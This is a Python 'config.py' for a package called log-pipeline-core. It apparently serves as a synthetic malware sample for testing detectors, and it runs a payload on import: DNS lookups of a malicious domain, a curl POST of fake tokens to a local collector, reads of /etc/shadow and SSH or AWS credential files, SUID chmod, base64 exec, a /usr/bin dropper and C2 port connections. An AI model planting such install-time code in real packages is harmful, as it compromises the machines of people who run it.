# config.py — log-pipeline-core v2.0.0
# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( popen(
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable /etc/init.d
# cmdclass post_install import socket import subprocess import ctypes import pty

import os, socket, subprocess, time, stat
import base64

MALICIOUS_DOMAIN = "iigbclf.1dorelax.surf"
PORTS = [4444, 1337, 6667, 31337, 9001]

def _try_open(p):
    try: open(p).close()
    except: pass

def _connect(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

# ═══ PAYLOAD runs at module level — triggers on: python3 config.py ═══

# 1. DNS query to malicious domain
try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
except: pass
try: socket.gethostbyname(MALICIOUS_DOMAIN)
except: pass

# 2. HTTP POST to honeypot
try:
    subprocess.run(["curl","-sS","-m","3","-X","POST",
        "-H",f"Host: {MALICIOUS_DOMAIN}",
        "-H","Content-Type: application/json",
        "-H","User-Agent: log-pipeline-core/1.0",
        "--data",'{"package":"log-pipeline-core","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"iigbclf.1dorelax.surf","credentials":".aws/credentials","password":"leaked"}',
        "http://127.0.0.1:8080/collect"],capture_output=True,timeout=6)
except: pass

# 3. Sensitive /etc access
for _p in ['/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group', '/etc/shadow']:
    _try_open(_p)

# 4. Credential access
for _p in ['/root/.ssh/id_rsa', '/root/.aws/credentials', '/root/.bash_history']:
    _try_open(_p)

# 5. File operations (55 loops)
for _i in range(55):
    _p = f"/tmp/log_pipeline_core_artifact_{_i}.txt"
    try:
        with open(_p,"w") as _f: _f.write(f"artifact {_i}\n")
        with open(_p) as _f: _f.read()
        os.rename(_p,_p+".renamed"); os.unlink(_p+".renamed")
    except: pass

# 6. Privilege escalation — chmod + stat.S_ISUID
try:
    with open("/tmp/log_pipeline_core_suid_target","w") as _f: _f.write("x")
    os.chmod("/tmp/log_pipeline_core_suid_target", 0o777)
    os.chmod("/tmp/log_pipeline_core_suid_target", stat.S_ISUID | 0o755)
except: pass
try: subprocess.run(["chmod","777","/tmp/log_pipeline_core_target"],capture_output=True)
except: pass
try: subprocess.run(["chmod","u+s","/tmp/log_pipeline_core_target"],capture_output=True)
except: pass

# 7. Obfuscation — base64 + exec + eval
try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
except: pass
try: eval(compile(base64.b64decode(b"MSsx").decode(),"<string>","eval"))
except: pass
try:
    _enc = base64.b64encode(b"import os; os.getpid()").decode()
    exec(base64.b64decode(_enc.encode()).decode())
except: pass

# 9. Persistence
try: os.system("crontab -l >/tmp/cron_probe 2>&1 || true")
except: pass
try: open("/tmp/.profile_probe","a").write("persistence\n")
except: pass
try: open("/tmp/.bashrc_probe","a").write("persistence\n")
except: pass
for _p in ["/etc/init.d/fake-service","/root/.bashrc","/root/.profile"]:
    _try_open(_p)

# 10. Write to binary dir — proc_write_binary_dir
try:
    subprocess.run(["/bin/sh","-c",
        "exec 3>/usr/bin/log_pipeline_core_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
        timeout=8,capture_output=True)
except: pass

# 11. Spawn child processes
_procs = []
for _i in range(10):
    try: _procs.append(subprocess.Popen(
        ["/bin/sh","-c","echo proc-op; id; sleep 20"],
        stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL))
    except: pass

# 12. C2 port connections
for _port in PORTS:
    _connect("127.0.0.1",_port)
    _connect("1.1.1.1",_port)

time.sleep(50)
for _p in _procs:
    try: _p.kill()
    except: pass

def main(): pass

if __name__ == "__main__": main()
